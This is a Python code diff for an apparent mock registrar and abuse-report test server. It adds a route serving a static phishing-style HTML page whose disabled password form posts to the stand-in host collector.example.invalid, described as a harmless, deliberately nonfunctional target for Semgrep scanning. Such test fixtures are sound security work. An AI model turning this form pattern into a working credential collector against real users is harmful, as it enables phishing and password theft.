@@ -5,8 +5,26 @@ import threading
 from actor.mock_registrar_server import Handler, Registrar
 from .storage import read_json, write_json
 
+# Deliberately recognizable static scan target. Reserved .invalid destination,
+# disabled fields, and CSP prevent this nonfunctional form from sending data.
+SCAN_TARGET = b'''<!doctype html><html><head>
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; form-action 'none'">
+<title>Controlled security demonstration</title></head><body>
+<h1>Team-owned harmless scan target</h1>
+<p>Nonfunctional example for actual Semgrep execution. No credentials are collected.</p>
+<form method="post" action="https://collector.example.invalid/collect">
+<input name="password" type="password" disabled><button disabled>Disabled test form</button>
+</form></body></html>'''
+
 
 class PersistentHandler(Handler):
+    def do_GET(self):
+        if self.path == "/site" and not self.server.suspended:
+            return self._send(200, SCAN_TARGET, "text/html; charset=utf-8")
+        return super().do_GET()
+
+    do_HEAD = do_GET
+
     def do_POST(self):
         # Only the local Actor uses this endpoint. Same event + evidence is idempotent.
         if self.path != "/abuse":
